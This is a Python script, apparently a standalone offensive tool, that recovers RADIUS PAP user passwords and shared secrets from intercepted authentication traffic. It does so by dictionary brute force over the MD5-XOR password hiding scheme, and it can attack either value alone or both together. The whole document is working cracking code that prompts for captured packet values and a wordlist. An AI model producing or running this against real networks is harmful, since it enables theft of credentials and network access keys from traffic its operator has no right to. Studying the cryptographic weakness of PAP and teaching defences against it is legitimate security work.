
#Modules

import os, sys, time
from hashlib import md5
import binascii

try:

    #Intro screen + help

    print("\n===============================\nRADIUS PAP Password Decryptor\n                By TheTiinko\n===============================\n")
    help_var = input("Need help?(y/n)")
    if help_var == "y" or help_var == "Y" :
        print("\nThis script gives you the ability to brute force the password and/or shared key from the intercepted RADIUS Accept-Request traffic.\nYou will need the authenticator value and the encrypted password from the traffic.\nIf you are in possesion of either user password or the shared key for RADIUS PAP authentification, paste it in the input, if not just press Enter key when asked for it.")
    elif help_var == "n" or help_var == "N":
        pass
    else:
        print("Invalid input!")
        sys.exit()

    #Saving the variables via user input

    AUTEHNTICATOR = input("\nPlease enter the Authenticator value:")
    if not AUTEHNTICATOR:
        print("\n\nEmpty value!\nByebye\n")
        sys.exit()
    AUTEHNTICATOR = AUTEHNTICATOR.strip()
    AUTEHNTICATOR = [AUTEHNTICATOR[x:x + 2] for x in range(0, len(AUTEHNTICATOR), 2)] #Sorting the Authenticator value into list by 2 so we can translate to hex bytes later

    HASH_PASS = input("Please enter the encrypted password found in RADIUS traffic:") #Encrypted password
    if not HASH_PASS:
        print("\n\nEmpty value!\nByebye\n")
        sys.exit()
    HASH_PASS = HASH_PASS.strip()
    PASSWORD_STR = input("Please enter the password if you know it, if not leave empty:")
    SECRET_STR = input("Please enter the shared key for RADIUS authentification if you know it, if not leave empty:")


    find_var = 0                    # if find_var 0 -> double brute force, if 1 -> use Password to search for shared key, if 2 -> use shared key to find the password

    # Condition checker for what the user is looking for (key or password)
    if (PASSWORD_STR != '') and (SECRET_STR != ''):
        print("Seems like you already got both the shared key and password. Bye!")
        sys.exit()
    elif PASSWORD_STR != '':
        find_var = 1
        print("\nLet's find that shared key.\n")
    elif SECRET_STR != '':
        find_var = 2
        print("\nLet's find that password.\n")
    else:
        print("\nLet's find the shared key and password.\n")

    DICT_PASS = input("Please enter the path to the dictionary (.txt) that will be used for brute-force:") #Dict for BF-ing
    if not DICT_PASS:
        print("\n\nEmpty value!\nByebye\n")
        sys.exit()

    # Transforming the Authenticator to hex devided byte format

    auth_bytes= b''
    for i in AUTEHNTICATOR:
        auth_bytes += bytes.fromhex(i)

    # Functions

    def byte_xor(hash, line):
        return bytes([_a ^ _b for _a, _b in zip(hash, line)]) #XOR function between the above mentioned MD5 and the password
    def hash_and_result(auth_bytes, SECRET, PASSWORD):
          hash = md5(SECRET + auth_bytes).digest() #MD5 digest of Shared key prepended to authentifikator bytes
          result = binascii.hexlify(byte_xor(hash, PASSWORD)).decode("utf-8") # result of XOR
          return result
    def print_and_exit(SECRET,PASSWORD): #print and sysexit upon success
        print("\n## Success!! ##\n=========================\nPassword is: "+PASSWORD.strip()+"\nShared key is: " + SECRET.strip()+"\n==========================\n\nDone!!\n")
        sys.exit()
    
    #If blocks depending on the given information is below

    #Searching for a secret key if we know the password

    if find_var == 1:
        print("\nStarting...this might take a while.\n")
        PASSWORD = bytes(PASSWORD_STR,'utf-8') + ((16 - len(PASSWORD_STR)) * b'\0')  #Password tring to bytes output + filling the rest up to 16 places with \00
                                                                    #TOdo -> if there is more than 16 characters the password will be devided check https://www.untruth.org/~josh/security/radius/radius-auth.html

                                                                    # c1 = p1 XOR MD5(S + RA)
                                                                    # c2 = p2 XOR MD5(S + c1)
                                                                    # .
                                                                    # .
                                                                    # .
                                                                    # cn = pn XOR MD5(S + cn-1)
        with open(DICT_PASS, encoding='latin-1') as f:
            for line in f:
                SECRET = bytes(line.replace("\n",""),'UTF-8') #removing the \n characters
                result = hash_and_result(auth_bytes, SECRET, PASSWORD)
                if result != HASH_PASS:
                    pass
                else:
                    print_and_exit(line,PASSWORD_STR)
        f.close()

    #Searching for the password if we know the secret key

    if  find_var == 2:
        print("\nStarting...this might take a while.\n")
        SECRET = bytes(SECRET_STR, 'UTF-8') #Secret shared key string to bytes output

        with open(DICT_PASS,encoding='latin-1') as f:
            for line in f:
                line_str = line.replace("\n","") #removing the \n characters
                PASSWORD = bytes(line_str,'utf-8') + ((16 - len(line_str)) * b'\0')
                result = hash_and_result(auth_bytes, SECRET, PASSWORD)
                if result != HASH_PASS:
                    pass
                else:
                    print_and_exit(SECRET_STR,line_str)
        f.close()

    #Searching for password and secret key, takes a while because it's a double dictionary brute force

    if  find_var == 0:
        print("\nStarting...this might take a while.\n")

        with open(DICT_PASS,encoding='latin-1') as f:
            for line in f:
                line_str = line.replace("\n","") #[:-1] is for removing the \n characters
                PASSWORD = bytes(line_str,'utf-8') + ((16 - len(line_str)) * b'\0')

                with open(DICT_PASS,encoding='latin-1') as f_1:
                    for line1 in f_1:
                        SECRET = bytes(line1.replace("\n",""), 'UTF-8') #Secret shared key string to bytes output
                        result = hash_and_result(auth_bytes, SECRET, PASSWORD)
                        if result != HASH_PASS:
                            pass  
                        else:
                          print_and_exit(line1,line)
        f.close()

    

except KeyboardInterrupt:
    print("\n\nByebye\n")
    sys.exit()